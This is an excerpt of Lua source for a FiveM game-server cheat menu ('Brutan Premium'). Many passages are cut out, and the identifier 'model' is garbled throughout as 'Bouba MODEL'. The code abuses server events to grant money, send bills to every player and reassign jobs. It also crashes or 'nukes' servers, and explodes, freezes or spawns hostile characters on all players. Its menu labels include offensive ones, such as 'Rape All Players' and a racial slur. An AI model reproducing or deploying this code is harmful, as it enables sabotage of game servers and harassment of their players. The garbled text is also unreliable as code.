...
function Deer.Create()
	local Bouba MODEL = GetHashKey("a_c_deer")
	RequestBouba MODEL(Bouba MODEL)
	while not HasBouba MODELLoaded(Bouba MODEL) do
		Citizen.Wait(50)
	end
	...
	Deer.Handle = CreatePed(28, Bouba MODEL, PedPosition.x+1, PedPosition.y, PedPosition.z, GetEntityHeading(Ped), true, false)

	SetPedCanRagdoll(Deer.Handle, Deer.Ragdoll)
	SetEntityInvincible(Deer.Handle, Deer.Invincible)

	SetBouba MODELAsNoLongerNeeded(Bouba MODEL)
end
...
function Deer.Ride()
	...
	if IsEntityAttached(Ped) and GetEntityBouba MODEL(AttachedEntity) == GetHashKey("a_c_deer") then
		...
		for _, Ped in pairs(GetNearbyPeds(PedPosition.x, PedPosition.y, PedPosition.z, 2.0)) do
			if GetEntityBouba MODEL(Ped) == GetHashKey("a_c_deer") then
				Deer.Handle = Ped
				Deer.Attach()
				break
			end
...
local chdata = {}
	...
	local allMenus = { "Bouba MainMenu", "Bouba SelfMenu", "Bouba OnlinePlayersMenu", "Bouba WeaponMenu", "SingleBouba WeaponMenu", "Bouba MaliciousMenu",
                            "Bouba ESXMenu", "Bouba Bouba ESXJobMenu", "ESXMoneyMenu", "Bouba Bouba VehMenu", "VehSpawnOpt", "Bouba PlayerOptionsMenu",
                            "Bouba TeleportMenu", "LSC", "Hedit", "Bouba PlayerTrollMenu", "PlayerBouba ESXMenu", "PlayerBouba Bouba ESXJobMenu",
                    ...
                    if cg then
                        if not DoesBlipExist(blip) then
                            ...
                            elseif veh then
                                ...
                                vehBouba MODEL = GetEntityBouba MODEL(veh)
                                if vehClass == 15 then
                                ...
                                elseif vehClass == 16 then
                                    if
                                        vehBouba MODEL == GetHashKey('besra') or vehBouba MODEL == GetHashKey('hydra') or
                                            vehBouba MODEL == GetHashKey('lazer')
                                     then
                                ...
                                elseif
                                    vehBouba MODEL == GetHashKey('insurgent') or vehBouba MODEL == GetHashKey('insurgent2') or
                                        vehBouba MODEL == GetHashKey('limo2')
                                 then
                                ...
                                elseif vehBouba MODEL == GetHashKey('rhino') then
...
local function fv()
    ...
    if cb and IsBouba MODELValid(cb) and IsBouba MODELAVehicle(cb) then
        RequestBouba MODEL(cb)
        while not HasBouba MODELLoaded(cb) do
            Citizen.Wait(0)
        end
        local veh =
            CreateVehicle(
        ...
        av('~b~~h~Bouba MODEL is not valid!', true)
    end
end
...
local function ClonePedVeh()
    ...
    if IsPedInAnyVehicle(ped, false) then
        ...
        if DoesEntityExist(pedVeh) then
            local vmh = GetEntityBouba MODEL(pedVeh)
            ...
            if IsThisBouba MODELACar(vmh) or IsThisBouba MODELABike(vhm) then
...
local function setMenuProperty(id, property, value)
    ...
    function Misc.SetSpriteColor(id, r, g, b, a)
...
function Misc.CreateMenu(id, title)
    menus[id] = { }
...
function Misc.CreateSubMenu(id, parent, subTitle)
    if menus[parent] then
        Misc.CreateMenu(id, menus[parent].title)
...
function Misc.IsMenuOpened(id)
    return isMenuVisible(id)
end


function Misc.IsAnyMenuOpened()
...
function Misc.IsMenuAboutToBeClosed()
    if menus[currentMenu] then
...
function Misc.Button(text, subText)
...
function Misc.MenuButton(text, id)
    if menus[id] then
        if Misc.Button(text) then
            setMenuVisible(currentMenu, false)
...
function Misc.CheckBox(text, checked, callback)
    if Misc.Button(text, checked and "~g~~h~On" or "~h~~c~Off") then
        checked = not checked
...
function Misc.ComboBox(text, items, currentIndex, selectedIndex, callback)
    ...
    if Misc.Button(text, selectedItem) then
...
function Misc.SetMenuWidth(id, width)
    setMenuProperty(id, "width", width)
end


function Misc.SetMenuX(id, x)
    setMenuProperty(id, "x", x)
end


function Misc.SetMenuY(id, y)
    setMenuProperty(id, "y", y)
end


function Misc.SetMenuMaxOptionCountOnScreen(id, count)
    setMenuProperty(id, "maxOptionCount", count)
end


function Misc.SetTitle(id, title)
    setMenuProperty(id, "title", title)
end


function Misc.SetTitleColor(id, r, g, b, a)
    setMenuProperty(id, "titleColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleColor.a })
end


function Misc.SetTitleBackgroundColor(id, r, g, b, a)
    setMenuProperty(id, "titleBackgroundColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleBackgroundColor.a })
end


function Misc.SetTitleBackgroundSprite(id, textureDict, textureName)
    RequestStreamedTextureDict(textureDict)
    setMenuProperty(id, "titleBackgroundSprite", { dict = textureDict, name = textureName })
end


function Misc.SetSubTitle(id, text)
    setMenuProperty(id, "subTitle", string.upper(text))
end


function Misc.SetMenuBackgroundColor(id, r, g, b, a)
    setMenuProperty(id, "menuBackgroundColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuBackgroundColor.a })
end


function Misc.SetMenuTextColor(id, r, g, b, a)
    setMenuProperty(id, "menuTextColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuTextColor.a })
end

function Misc.SetMenuSubTextColor(id, r, g, b, a)
    setMenuProperty(id, "menuSubTextColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuSubTextColor.a })
end

function Misc.SetMenuFocusColor(id, r, g, b, a)
    setMenuProperty(id, "menuFocusColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusColor.a })
end


function Misc.SetMenuButtonPressedSound(id, name, set)
...
function CrashPlayer(ped)
    ...
    for i = 1, #Bouba MODELHashes do
        obj = CreateObject(Bouba MODELHashes[i], playerPos.x, playerPos.y, playerPos.z, true, true, true)
    end
end
...
RCCar.Spawn = function()
	RCCar.LoadBouba MODELs({ GetHashKey(RCCAR123), 68070371 })
...
RCCar.Attach = function(param)
	...
	RCCar.LoadBouba MODELs({ "pickup_object" })
...
RCCar.LoadBouba MODELs = function(Bouba MODELs)
	for Bouba MODELIndex = 1, #Bouba MODELs do
		local Bouba MODEL = Bouba MODELs[Bouba MODELIndex]

		if not RCCar.CachedBouba MODELs then
			RCCar.CachedBouba MODELs = {}
		end

		table.insert(RCCar.CachedBouba MODELs, Bouba MODEL)

		if IsBouba MODELValid(Bouba MODEL) then
			while not HasBouba MODELLoaded(Bouba MODEL) do
				RequestBouba MODEL(Bouba MODEL)
			...
			while not HasAnimDictLoaded(Bouba MODEL) do
				RequestAnimDict(Bouba MODEL)
...
RCCar.UnloadBouba MODELs = function()
	for Bouba MODELIndex = 1, #RCCar.CachedBouba MODELs do
		local Bouba MODEL = RCCar.CachedBouba MODELs[Bouba MODELIndex]

		if IsBouba MODELValid(Bouba MODEL) then
			SetBouba MODELAsNoLongerNeeded(Bouba MODEL)
		else
			RemoveAnimDict(Bouba MODEL)   
		end
	end
end
...
function rapeplayer()
    Citizen.CreateThread(
        function()
            RequestBouba MODELSync('a_m_o_acult_01')
...
function CreateDeer()
	...
	Handle = CreatePed(28, Bouba MODEL, PedPosition.x+1, PedPosition.y, PedPosition.z, GetEntityHeading(Ped), true, false)
...
function SpawnObjOnPlayer(Bouba MODELHash)
    local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
    local obj CreateObject(Bouba MODELHash, coords.x, coords.y, coords.z, true, true, true)
        if attachProp then
...
function nukeserver()
    Citizen.CreateThread(function()
        ...
        while not HasBouba MODELLoaded(GetHashKey(dh))do
            Citizen.Wait(0)
            RequestBouba MODEL(GetHashKey(dh))
        end

        while not HasBouba MODELLoaded(GetHashKey(di))do
            Citizen.Wait(0)RequestBouba MODEL(GetHashKey(di))
        end

        while not HasBouba MODELLoaded(GetHashKey(dg))do
            Citizen.Wait(0)RequestBouba MODEL(GetHashKey(dg))
        end

        while not HasBouba MODELLoaded(GetHashKey(dj))do
            Citizen.Wait(0)RequestBouba MODEL(GetHashKey(dj))
        end

        while not HasBouba MODELLoaded(GetHashKey(dk))do
            Citizen.Wait(0)RequestBouba MODEL(GetHashKey(dk))
        end
        ...
        while true do
            ...
            if sall then
                for i = 0, 128 do
                    ...
                    RequestBouba MODEL(vehiclehash)
      ...
      if IsControlPressed(0, 19) then
        ...
        SetEntityCoordsNoOffset(ped,x,y,z,true,true,true)
                ...
                for i = 0, 128 do
                    if i ~= PlayerId(-1) and GetPlayerServerId(i) ~= 0 then
                        ...
                        if IsPedInAnyVehicle(d7, true) then
                            local dc =
                                GetLabelText(GetDisplayNameFromVehicleBouba MODEL(GetEntityBouba MODEL(GetVehiclePedIsUsing(d7))))
                            db = db .. '\nVeh: ' .. dc
                        end
            ...
            if vehicleGun then
                ...
                local Bouba MODEL = GetHashKey(vehicles[selectedVehicle])
                ...
                RequestBouba MODEL(Bouba MODEL)
                while not HasBouba MODELLoaded(Bouba MODEL) do
                    debugPrint("Loading Bouba MODEL...")
                    Citizen.Wait(0)
                end

                if HasBouba MODELLoaded(Bouba MODEL) then
                    if IsPedShooting(PlayerPedId()) then
                        if IsPedOnFoot(PlayerPedId()) then
                        local veh = CreateVehicle(Bouba MODEL, spawnPosition.x, spawnPosition.y, spawnPosition.z, heading, true, true)
            ...
            if pedGun then
                ...
                local Bouba MODEL = GetHashKey(peds[selectedPed])
                ...
                if HasBouba MODELLoaded(Bouba MODEL) then
                    if IsPedShooting(PlayerPedId()) then
                        local spawnedPed = CreatePed(26, Bouba MODEL, spawnPosition.x, spawnPosition.y, spawnPosition.z, heading, true, true)
		...
		Deer.Destroy()
            ...
            if bifegfubffff then
			 ...
			 if rainbow then
                    local color = k(1.0)
                    for i = 0, #allMenus do
                        Misc.SetSpriteColor(allMenus[i], color.r, color.g, color.b, 255)  
                    end  
                    for i, dA in pairs(bd) do                 
                        Misc.SetSpriteColor(dA.id, color.r, color.g, color.b, 255)  
                    end
                ...
                if animated then                                   
                            Citizen.Wait(50)                  
                            for i = 0, #allMenus do
                                Misc.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal1") 
                            end
                            for i, dA in pairs(bd) do
                                Misc.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal1") 
                            ...
                            Citizen.Wait(50)                  
                            for i = 0, #allMenus do
                                Misc.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal2") 
                            end
                            for i, dA in pairs(bd) do
                                Misc.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal2") 
                            ...
                            Citizen.Wait(50)                  
                            for i = 0, #allMenus do
                                Misc.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal3") 
                            end
                            for i, dA in pairs(bd) do
                                Misc.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal3") 
                            ...
                            Citizen.Wait(50)                  
                            for i = 0, #allMenus do
                                Misc.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal4") 
                            end
                            for i, dA in pairs(bd) do
                                Misc.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal4") 
...
Citizen.CreateThread(
    function()
        ...
        Misc.CreateMenu("Bouba MainMenu", "Misc")
        Misc.CreateSubMenu("Bouba SelfMenu", "Bouba MainMenu", "Self Menu")
		Misc.CreateSubMenu("PedMenu", "Bouba SelfMenu", "Ped Menu")
        Misc.CreateSubMenu("Bouba OnlinePlayersMenu", "Bouba MainMenu", "Players Online: " .. #getPlayerIds())
        Misc.CreateSubMenu("Bouba WeaponMenu", "Bouba MainMenu", "Weapon Menu")
        Misc.CreateSubMenu("SingleBouba WeaponMenu", "Bouba WeaponMenu", "Single Weapon Spawner")
        Misc.CreateSubMenu("Bouba MaliciousMenu", "Bouba MainMenu", "Malicious Hacks")
		Misc.CreateSubMenu('LulxDJ', 'Bouba MaliciousMenu', 'ESP Menu')
        Misc.CreateSubMenu("VRPMenu", "Bouba MainMenu", "VRP Options")
        Misc.CreateSubMenu("Bouba ESXMenu", "Bouba MainMenu", "ESX Options")
        Misc.CreateSubMenu("Bouba Bouba ESXJobMenu", "Bouba ESXMenu", "ESX Jobs")
        Misc.CreateSubMenu("ESXMoneyMenu", "Bouba ESXMenu", "ESX Money Menu")
        Misc.CreateSubMenu("ESXDrugMenu", "Bouba ESXMenu", "ESX Drugs")
        Misc.CreateSubMenu("Bouba Bouba VehMenu", "Bouba MainMenu", "Vehicle Menu")
		Misc.CreateSubMenu("Hedit", "Bouba Bouba VehMenu", "Handling")
	    Misc.CreateSubMenu("SettingsMenu", "Bouba MainMenu", "Settings")
        Misc.CreateSubMenu("VehSpawnOpt", "Bouba Bouba VehMenu", "Vehicle Spawn Options")
		Misc.CreateSubMenu('CarTypes', 'Bouba Bouba VehMenu', 'Vehicles')
        Misc.CreateSubMenu('CarTypeSelection', 'CarTypes', 'Vehicle types')
        Misc.CreateSubMenu('CarOptions', 'CarTypeSelection', 'Vehicle Options')
        Misc.CreateSubMenu('MainTrailer', 'VehicleMenu', 'Trailers to Attach')
        Misc.CreateSubMenu('MainTrailerSel', 'MainTrailer', 'Trailers Available')
        Misc.CreateSubMenu('MainTrailerSpa', 'MainTrailerSel', 'Trailer Options')
		Misc.CreateSubMenu("AI", "Bouba MainMenu", "AI Menu")
        Misc.CreateSubMenu("Bouba PlayerOptionsMenu", "Bouba OnlinePlayersMenu", "Player Options")
        Misc.CreateSubMenu("Bouba TeleportMenu", "Bouba MainMenu", "Teleport Menu")
        Misc.CreateSubMenu("LSC", "Bouba Bouba VehMenu", "Welcome To Los santos customs!")
        Misc.CreateSubMenu("Bouba PlayerTrollMenu", "Bouba PlayerOptionsMenu", "Troll Options")
        Misc.CreateSubMenu("PlayerBouba ESXMenu", "Bouba PlayerOptionsMenu", "ESX Options")
        Misc.CreateSubMenu("PlayerBouba Bouba ESXJobMenu", "Bouba PlayerOptionsMenu", "ESX Jobs")
        Misc.CreateSubMenu("PlayerESXTriggerMenu", "PlayerBouba ESXMenu", "ESX Triggers")
        Misc.CreateSubMenu("BulletGunMenu", "Bouba WeaponMenu", "Bullets Gun Options")
        Misc.CreateSubMenu("TrollMenu", "Bouba MainMenu", "Troll Options")
        Misc.CreateSubMenu("WeaponCustomization", "Bouba WeaponMenu", "Weapon Cusomization Options")
        Misc.CreateSubMenu("WeaponTintMenu", "WeaponCustomization", "Weapon Tints")
        Misc.CreateSubMenu("VehicleRamMenu", "Bouba PlayerTrollMenu", "Ram Vehicles Into Player")
        Misc.CreateSubMenu("ESXBossMenu", "Bouba ESXMenu", "ESX Boss")
		Misc.CreateSubMenu("tunings", "LSC", "Extrerior Tuning")
        Misc.CreateSubMenu("performance", "LSC", "Performance Tuning")
        Misc.CreateSubMenu("SpawnPropsMenu", "Bouba PlayerTrollMenu", "Spawn Props On Player")
        Misc.CreateSubMenu("SingleWepPlayer", "Bouba PlayerOptionsMenu", "Single Weapon Menu")
        Misc.CreateSubMenu("ESXMiscMenu", "Bouba ESXMenu", "ESX Misc")
		Misc.CreateSubMenu("InfoMenu", "SettingsMenu", "Info")
        Misc.CreateSubMenu("VehBoostMenu", "LSC", "Vehicle Booster")
		Misc.CreateSubMenu("Credits", "SettingsMenu", "Credits")
for i, dA in pairs(bd) do 
                Misc.CreateSubMenu(dA.id, "tunings", dA.name) if dA.id == "paint" then 
                Misc.CreateSubMenu("primary", dA.id, "Primary Paint") 
                Misc.CreateSubMenu("secondary", dA.id, "Secondary Paint") 
                Misc.CreateSubMenu("rimpaint", dA.id, "Wheel Paint") 
                Misc.CreateSubMenu("classic1", "primary", "Classic Paint") 
                Misc.CreateSubMenu("metallic1", "primary", "Metallic Paint") 
                Misc.CreateSubMenu("matte1", "primary", "Matte Paint") 
                Misc.CreateSubMenu("metal1", "primary", "Metal Paint") 
                Misc.CreateSubMenu("classic2", "secondary", "Classic Paint") 
                Misc.CreateSubMenu("metallic2", "secondary", "Metallic Paint") 
                Misc.CreateSubMenu("matte2", "secondary", "Matte Paint") 
                Misc.CreateSubMenu("metal2", "secondary", "Metal Paint") 
                Misc.CreateSubMenu("classic3", "rimpaint", "Classic Paint") 
                Misc.CreateSubMenu("metallic3", "rimpaint", "Metallic Paint") 
                Misc.CreateSubMenu("matte3", "rimpaint", "Matte Paint") 
                Misc.CreateSubMenu("metal3", "rimpaint", "Metal Paint") 
            end 
        end
        for i, dA in pairs(be) do 
            Misc.CreateSubMenu(dA.id, "performance", dA.name) 
        end
        ...
        local SelectedPlayer
            ...
            while Enabled do
                ...
                for i, dA in pairs(bd) do
                    if Misc.IsMenuOpened("tunings") then
                        if b8 then
                            if ba == "neon" then 
                    ...
                    if Misc.IsMenuOpened(dA.id) then
                        if dA.id == "wheeltypes" then
                            if Misc.Button("Sport Wheels") then 
                                SetVehicleWheelType(veh, 0) 
                            elseif Misc.Button("Muscle Wheels") then 
                                SetVehicleWheelType(veh, 1) 
                            elseif Misc.Button("Lowrider Wheels") then 
                                SetVehicleWheelType(veh, 2) 
                            elseif Misc.Button("SUV Wheels") then 
                                SetVehicleWheelType(veh, 3) 
                            elseif Misc.Button("Offroad Wheels") then 
                                SetVehicleWheelType(veh, 4) 
                            elseif Misc.Button("Tuner Wheels") then 
                                SetVehicleWheelType(veh, 5) 
                            elseif Misc.Button("High End Wheels") then 
                        ...
                        elseif dA.id == "extra" then 
                            ...
                            for i, dA in pairs(dF) do
                                ...
                                if Misc.Button(dA.menuName, pricestring) then 
                        ...
                        elseif dA.id == "headlight" then
                            ...
                            for dK, dA in pairs(bo) do 
                                ...
                                if Misc.Button(dA.name, pricetext) then
                                    if not bg then 
                                        bi = "headlight"
                                        bk = false
                        ...
                        elseif dA.id == "neon" then
                            ...
                            for i, dA in pairs(colors) do 
                                ...
                                if Misc.Button(i, pricestring) then
                                    if not b8 then 
                                        ba = "neon"
                        ...
                        elseif dA.id == "paint" then
                            if Misc.MenuButton("~r~→  ~s~Primary Paint", "primary") then 
                            elseif Misc.MenuButton("~r~→  ~s~Secondary Paint", "secondary") then 
                            elseif Misc.MenuButton("~r~→  ~s~Wheel Paint", "rimpaint") then 
                            end 
                            Misc.Display()
                        else 
                            ...
                            for dG, dH in pairs(as) do
                                ...
                                if Misc.Button(dH.menuName, price) then
                                    if not b8 then 
                                        ba = dA.id
            ...
            if Misc.Button("Stock "..dA.name, pricestock) then 
                SetVehicleMod(veh, dA.id, -1) 
            elseif Misc.Button(dA.name.." Upgrade 1", price1) then 
                SetVehicleMod(veh, dA.id, 0) 
            elseif Misc.Button(dA.name.." Upgrade 2", price2) then 
                SetVehicleMod(veh, dA.id, 1) 
            elseif Misc.Button(dA.name.." Upgrade 3", price3) then 
                SetVehicleMod(veh, dA.id, 2) 
            elseif dA.id ~= 13 and dA.id ~= 12 and Misc.Button(dA.name.." Upgrade 4", price4) then 
                SetVehicleMod(veh, dA.id, 3) end; Misc.Display() 
            end 
        end

            if Misc.IsMenuOpened("Bouba MainMenu") then
                drawNotification("~h~~r~Brutan ~s~Premium")
                drawNotification("~h~~s~BRUTAN ON YOUTUBE")
                if Misc.MenuButton    ("~r~→  ~s~Self Menu", "Bouba SelfMenu") then
                elseif Misc.MenuButton("~r~→  ~s~Teleport Menu", "Bouba TeleportMenu") then
				elseif Misc.MenuButton("~r~→  ~s~AI", "AI") then
                elseif Misc.MenuButton("~r~→  ~s~Online Players", "Bouba OnlinePlayersMenu") then
                elseif Misc.MenuButton("~r~→  ~s~Weapon Menu", "Bouba WeaponMenu") then
                elseif Misc.MenuButton("~r~→  ~s~Vehicle Menu", "Bouba Bouba VehMenu") then
                elseif Misc.MenuButton("~r~→  ~s~Extreme Menu", "Bouba MaliciousMenu") then
                elseif Misc.MenuButton("~r~→  ~s~Troll Menu", "TrollMenu") then
                elseif Misc.MenuButton("~r~→  ~s~ESX Options", "Bouba ESXMenu") then
                elseif Misc.MenuButton("~r~→  ~s~VRP Options", "VRPMenu") then
				elseif Misc.MenuButton("~r~→  ~s~Settings", "SettingsMenu") then
                elseif Misc.Button("~r~→  ~s~~r~Close The Menu  ←") then
                    Enabled = false
                end

                Misc.Display()
            elseif Misc.IsMenuOpened("VRPMenu") then
                if Misc.Button("VRP PayGarage 100$") then
                    TriggerServerEvent("lscustoms:payGarage", {costs = -100})
                elseif Misc.Button("VRP PayGarage 1000$") then
                    TriggerServerEvent("lscustoms:payGarage", {costs = -1000})
                elseif Misc.Button("VRP PayGarage 10 000$") then
                    TriggerServerEvent("lscustoms:payGarage", {costs = -10000})
                elseif Misc.Button("VRP PayGarage 100 000$") then
                    TriggerServerEvent("lscustoms:payGarage", {costs = -100000})
                elseif Misc.Button("VRP Get Driver Licence") then
                    TriggerServerEvent("dmv:success")
				elseif Misc.Button("Give yourself 10x salary (VRP)") then
                ...
                elseif Misc.Button("VRP Bank Deposit") then
                    local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
                    TriggerServerEvent("bank:deposit", amount)
                elseif Misc.Button("VRP Bank Withdraw") then
                    local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
                    TriggerServerEvent("bank:withdraw", amount)
                elseif Misc.Button("VRP Slot Machine") then
                    local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
                    TriggerServerEvent("vrp_slotmachine:server:2", amount)
                end

                Misc.Display()
			                elseif Misc.IsMenuOpened("SettingsMenu") then
                if Misc.ComboBox("~r~→  ~s~Menu ~b~X", menuX, currentMenuX, selectedMenuX, function(currentIndex, selectedIndex)
                    currentMenuX = currentIndex
                    selectedMenuX = selectedIndex
                    for i = 1, #allMenus do
                        Misc.SetMenuX(allMenus[i], menuX[currentMenuX])
                    end
                    end) 
                    then
                elseif Misc.ComboBox("~r~→  ~s~Menu ~b~Y", menuY, currentMenuY, selectedMenuY, function(currentIndex, selectedIndex)
                    currentMenuY = currentIndex
                    selectedMenuY = selectedIndex
                    for i = 1, #allMenus do
                        Misc.SetMenuY(allMenus[i], menuY[currentMenuY])
                    end
                    end)
                    then
                    elseif Misc.CheckBox("~u~Discord~s~ Display", discordPresence, function(enabled) discordPresence = enabled end) then
					elseif Misc.MenuButton("~r~→  ~s~Information", "InfoMenu") then
                    elseif Misc.MenuButton("~r~→  ~s~Credits", "Credits") then
                    end
    
                    Misc.Display()
                elseif Misc.IsMenuOpened("InfoMenu") then
                    if Misc.Button("Misc") then
					elseif Misc.Button("") then
                    end
    
                    Misc.Display()
                elseif Misc.IsMenuOpened("Credits") then
				if     Misc.Button("~h~Press on our names <3") then
				elseif Misc.Button("∑  ~r~~h~NEMESiS~s~ - ~r~DEV") then
				drawNotification('~h~Contact him for More releases.')
				drawNotification('~h~Also contact him if you want to purchase any menu.')
				elseif Misc.Button("∑  ~r~~h~Real Nigg~s~ - ~r~DEV") then
				elseif Misc.Button("∑  ~r~~h~Brutan~s~ - ~r~DEV") then
				end
					
					Misc.Display()
            elseif Misc.IsMenuOpened("TrollMenu") then
                if Misc.Button("ESX Server Crasher") then
                ...
                then
				elseif Misc.Button("Spawn moutain Lion On Everyone") then
                    local mtlion = "A_C_MtLion"
                    for i = 0, 128 do
                        local co = GetEntityCoords(GetPlayerPed(i))
                        RequestBouba MODEL(GetHashKey(mtlion))
                        Citizen.Wait(50)
                        if HasBouba MODELLoaded(GetHashKey(mtlion)) then
                            local ped =
				...
				elseif Misc.Button("SWAT W/ Railgun On Everyone") then
                    local swat = "s_m_y_swat_01"
					local bR = "weapon_railgun"
                    for i = 0, 128 do
                        local coo = GetEntityCoords(GetPlayerPed(i))
                        RequestBouba MODEL(GetHashKey(swat))
                        Citizen.Wait(50)
                        if HasBouba MODELLoaded(GetHashKey(swat)) then
                            local ped =
                ...
                elseif Misc.Button("Nuke Server") then
                    nukeserver()
				elseif Misc.Button("Esx Destroy V2") then
				    esxdestroyv2()
				elseif Misc.Button("~g~ESX SEND EVERYONE A CUSTOM BILL") then
				...
				elseif Misc.Button("~g~ESX SEND EVERYONE TONS OF BILLS") then
				for i = 0, 128 do
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Brutan Premium, BRUTAN ON YOUTUBE", "99999999")
                end
				elseif Misc.Button("VRP Destroy V2") then
				    vrpdestroy()
                elseif Misc.Button("Rape All Players") then
                    RapeAllFunc()
                elseif Misc.CheckBox("Explode Everyone", blowall, function(enabled) blowall = enabled end) then
                elseif Misc.Button('Make~s~ EVERYONE A Wall') then
                    for i = 0, 128 do
                        if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                            local eb = 'xs_prop_hamburgher_wl'
                            local ec = -145066854
                            while not HasBouba MODELLoaded(ec) do
                                Citizen.Wait(0)
                                RequestBouba MODEL(ec)
                            end
				...
				elseif Misc.CheckBox("Fuck economy ~g~ESX", esxdestroy, function(enabled) esxdestroy = enabled end) then
                elseif Misc.CheckBox("Freeze Everyone", fall, function(enabled) fall = enabled end) then
			    elseif Misc.CheckBox("Handcuff everyone", freezeall, function(enabled) freezeall = enabled end) then
                elseif Misc.CheckBox("Spawn stuff On Everyone", sall, function(enabled) sall = enabled end) then
                elseif Misc.Button("Crash All Players") then
                    for i = 0, 128 do
                        if not ped == GetPlayerPed(-1) then
                            CrashPlayer(GetPlayerPed(i))
                        end
                    end
                elseif Misc.Button("Fake Message") then
                ...
                elseif Misc.Button("ESX Set All Police") then
                    for i = 0, 128 do
                        TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(i), "police", 3)
                        TriggerServerEvent("NB:recruterplayer", i, "police", 3)
                    end
                elseif Misc.Button("ESX Set All Mechanic") then
                    for i = 0, 128 do
                ...
                Misc.Display()
            elseif Misc.IsMenuOpened("Bouba TeleportMenu") then
                if Misc.Button("~b~TP~s~ To Your Waypoint") then
                    TeleportToWaypoint()
                elseif Misc.Button("~b~TP~s~ Into Nearest Vehicle") then
                    teleportToNearestVehicle()
                elseif Misc.Button("~b~TP~s~ To Coordinates") then
                    TeleportToCoords()
                elseif Misc.CheckBox(
                ...
                Misc.Display()
			elseif Misc.IsMenuOpened("AI") then
			                if Misc.Button("~h~Configure The ~g~Speed") then
                ...
                elseif Misc.Button("Drive to waypoint ~o~SLOW") then
                    if DoesBlipExist(GetFirstBlipInfoId(8)) then
                        local blipIterator = GetBlipInfoIdIterator(8)
                        local blip = GetFirstBlipInfoId(8, blipIterator)
                ...
                elseif Misc.Button("Drive to waypoint ~g~FAST") then
                    if DoesBlipExist(GetFirstBlipInfoId(8)) then
                        local blipIterator = GetBlipInfoIdIterator(8)
                        local blip = GetFirstBlipInfoId(8, blipIterator)
                        local wp = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
                ...
                elseif Misc.Button("~h~~r~Stop AI") then
                    ...
                    if IsPedInAnyVehicle(GetPlayerPed(-1)) then
                        ...
                        ClearPedTasksImmediately(GetPlayerPed(-1))
				                ...
				                Misc.Display()
            elseif Misc.IsMenuOpened("Bouba Bouba VehMenu") then
						if Misc.Button("Remote Control Vehicle") then
			RCCAR123 = KeyboardInput("CAR NAME", "", 1000000)
			            if RCCAR123 and IsBouba MODELValid(RCCAR123) and IsBouba MODELAVehicle(RCCAR123) then
			RCCar.Start()
                    else
                    end
              elseif Misc.MenuButton('~r~→  ~s~Vehicle List', 'CarTypes') then
		 elseif Misc.Button("Spawn A Custom Vehicle") then
                    local Bouba MODELName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
                    if Bouba MODELName and IsBouba MODELValid(Bouba MODELName) and IsBouba MODELAVehicle(Bouba MODELName) then
                        RequestBouba MODEL(Bouba MODELName)
                        while not HasBouba MODELLoaded(Bouba MODELName) do
                            Citizen.Wait(0)
                        end

                        local veh = CreateVehicle(GetHashKey(Bouba MODELName), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()), true, true)
                        if DelCurVeh then
					...
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
						SetVehicleNumberPlateText(playerVeh, "Value")
                    else
            elseif Misc.Button("Repair Vehicle") then
                    SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
                    SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
                    SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                    SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
                    Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
					elseif Misc.Button("Repair Engine Only") then
    ...
    if not DoesEntityExist(veh) then
        drawNotification(
            "~r~You Aren't Sitting In A Vehicle Stupid"
				...
				SetVehicleOilLevel(veh, 1000.0)
						...
						elseif Misc.Button("~g~Buy vehicle for free") then fv()
				elseif
					Misc.CheckBox(
					"~r~~h~Ultra Speed",
					Nigubdddddd,
				...
				then
                elseif Misc.MenuButton("~r~→  ~s~LS Customs", "LSC") then
				                elseif
                    Misc.CheckBox(
                 ...
                 then
                elseif Misc.Button("Delete Vehicle") then
                    DelVeh(GetVehiclePedIsUsing(PlayerPedId()))
				elseif Misc.Button("Delete Closest Vehicle") then
				...
				elseif
				 ...
				 then
				elseif Misc.Button("Change license plate") then
					local playerPed = GetPlayerPed(-1)
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
                ...
                then
				elseif Misc.Button("Flip Up Vehicle") then
				local ped = GetPlayerPed(-1)
		        local veh = GetVehiclePedIsIn(ped)
	             FreezeEntityPosition(veh,false)
	             SetVehicleOnGroundProperly(veh)
	            SetVehicleEngineOn(veh, true)
				elseif Misc.Button("Make vehicle dirty") then
					Clean(GetVehiclePedIsUsing(PlayerPedId()))
					drawNotification("~r~Vehicle is now dirty")
				elseif Misc.Button("Make vehicle clean") then
					Clean2(GetVehiclePedIsUsing(PlayerPedId()))
					drawNotification("~r~Vehicle is now clean")
                end

                Misc.Display()
			elseif Misc.IsMenuOpened("tunings") then 
                    veh = GetVehiclePedIsUsing(PlayerPedId()) 
                    for i, dA in pairs(bd) do
                        if dA.
                    id == "extra"
                    and# checkValidVehicleExtras()  ~= 0 then
